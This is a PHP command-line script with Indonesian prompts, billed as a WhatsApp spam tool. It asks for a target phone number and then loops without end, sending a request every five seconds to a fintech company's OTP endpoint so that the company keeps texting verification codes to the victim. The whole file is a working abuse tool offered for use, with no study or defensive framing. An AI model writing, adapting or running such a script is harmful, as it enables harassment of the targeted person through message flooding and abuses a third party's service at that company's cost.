<?php

// ================== FUNGSI PENDUKUNG ==================
function color($color = "default" , $text  = null)
{
    $arrayColor = array(
        'black_bg'   => '1;40',
        'red_bg'     => '1;41',
        'green_bg'   => '1;42',
        'yellow_bg'  => '1;43',
        'blue_bg'    => '1;44',
        'magenta_bg' => '1;45',
        'cyan_bg'    => '1;46',
        'white_bg'   => '1;47',
        'grey'       => '1;30',
        'red'        => '1;31',
        'green'      => '1;32',
        'yellow'     => '1;33',
        'blue'       => '1;34',
        'purple'     => '1;35',
        'nevy'       => '1;36',
        'white'      => '1;37',
    );  
    return "\033[".$arrayColor[$color]."m".$text."\033[0m";
}

function clear() {
  system('clear');
}

function fetch_value($str,$find_start,$find_end) {
  $start = @strpos($str,$find_start);
  if ($start === false) {
    return "";
  }
  $length = strlen($find_start);
  $end = strpos(substr($str,$start +$length),$find_end);
  return trim(substr($str,$start +$length,$end));
}

function acak($length = 3) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

// ================== LOGIKA UTAMA ==================

lagi:
clear();

// Tampilan Header Sederhana
echo color("red","================================\n");
echo color("green"," [ SIMPLIFIED SPAM WA - LOOP ]\n");
echo color("red","================================\n\n");

// Opsi Menu yang Disederhanakan
echo color("green"," 1: Mulai Spam Whatsapp\n");
echo color("red"," 2: Fitur Dihapus (Pesan Manual)\n");
echo color("red"," 3: Fitur Dihapus (Support Admin)\n\n");
echo color("green"," Pilih : ");
$aaa1 = trim(fgets(STDIN));

if ($aaa1 == 1) {
    goto whatsapp;
} else {
    echo color("red"," Pilihan Salah. Hanya opsi 1 yang didukung.\n");
    sleep(2);
    goto lagi;
}

whatsapp:
clear();
echo color("green","\n\n\𝐌𝐀𝐒𝐔𝐊𝐈𝐍 𝐍𝐎𝐓𝐀𝐑𝐆𝐄𝐓 (Using 08) : ");
$nomor = trim(fgets(STDIN)); 

if ($nomor == '-') {
  echo color("red"," Maksud lu apa mau nge spam gw?\n");
  sleep(5);
  goto lagi;
}

$count = 1;

// Loop untuk mengirim kode terus menerus
while (true) {
    echo color("yellow","\n======================================================\n");
    echo color("yellow","[ATTEMPT #".$count."] Mengirim ke ".$nomor."\n");
    echo color("yellow","======================================================\n");

    // ================== 🟢 SINGA FINTECH (WORKING) ==================
    $curl = curl_init();
    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://api.singafintech.com/otp/send',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_TIMEOUT => 10,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{"phone":"'.$nomor.'"}',
      CURLOPT_HTTPHEADER => array(
        'Content-Type: application/json'
      ),
    ));
    $response = curl_exec($curl);
    $result = fetch_value($response,'"success":',',');
    
    // Check for success or specific errors
    if ($result === 'true') {
      echo color("green"," ".acak(3)." Spam Whatsapp Berhasil Ke ".$nomor."\n");
    } else {
      echo color("red"," SINGA FINTECH GAGAL: ".$response."\n");
    }

    // Delay 5 detik sebelum upaya berikutnya
    echo color("nevy","\n Mengirim ulang dalam 5 detik... (Tekan CTRL+C untuk berhenti)\n");
    sleep(5); 
    $count++;
}

?>
